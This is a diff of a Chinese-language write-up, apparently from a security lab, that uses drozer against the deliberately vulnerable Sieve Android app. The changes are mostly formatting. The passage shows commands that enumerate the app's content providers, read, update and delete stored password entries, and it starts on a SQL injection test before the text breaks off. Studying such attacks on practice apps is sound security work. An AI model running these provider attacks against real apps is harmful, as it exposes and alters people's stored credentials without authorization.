@@ -10,13 +10,14 @@ date: 2024-06-04
 <!-- more -->
 如果想知道實際的狀況和content URI是什麼，可以參考[ChatGPT的說明](https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d)
 1. 起手式
+    
     從以下command的結果可以知道`com.mwr.example.sieve.DBContentProvider`和`com.mwr.example.sieve.FileBackupProvider`的狀況，並且從結果可以知道URI的形式長怎樣
     ```bash
     content://com.mwr.example.sieve.DBContentProvider/Keys/
     content://com.mwr.example.sieve.DBContentProvider/Passwords/
     content://com.mwr.example.sieve.DBContentProvider/Passwords
     ```
-    :::spoiler
+    
     ```bash
     dz> run app.provider.info -a com.mwr.example.sieve
     Attempting to run shell module
@@ -59,8 +60,8 @@ date: 2024-06-04
       content://com.mwr.example.sieve.DBContentProvider/Passwords/
       content://com.mwr.example.sieve.DBContentProvider/Passwords
     ```
-    :::
 2. 逆向
+    
     實際去看`DBContentProvider`這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情
     ```java
     @Override // android.content.ContentProvider
@@ -106,6 +107,7 @@ date: 2024-06-04
            email  aaa@bbb.com
         ```
     * update
+        
         \_id=2的data，被我們改掉了
         ```bash
         dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 --string password ccc --string email ddd@eee.com
@@ -127,6 +129,7 @@ date: 2024-06-04
            email  ddd@eee.com
         ```
     * delete
+        
         只剩下最一開始我們設定的data
         ```bash
         dz> run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2
@@ -142,6 +145,7 @@ date: 2024-06-04
            email  bernie6401@gmail.com
         ```
     * sqli
+        
         如下結果所示，的確存在sqli，並且可以得到完整的table
         ```bash
         # 先嘗試丟一些trash byte
